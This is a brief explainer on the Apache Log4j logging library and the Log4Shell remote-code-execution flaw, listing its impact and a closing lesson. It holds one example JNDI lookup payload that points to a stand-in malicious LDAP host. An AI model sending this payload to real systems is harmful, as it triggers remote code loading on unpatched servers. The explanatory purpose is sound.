# What is Apache Log4j?

Log4j is a Java-based logging library used by applications to record events such as errors, system activity, and user actions.

## Why it is important
It is widely used in enterprise software and backend systems.

## Log4Shell vulnerability
A flaw allowed attackers to execute code remotely by sending malicious log input.

Example payload:
${jndi:ldap://malicious-server/a}

## Impact
- Full system compromise
- Malware deployment
- Ransomware attacks

## Lesson
Even logging systems can become critical attack vectors if not secured.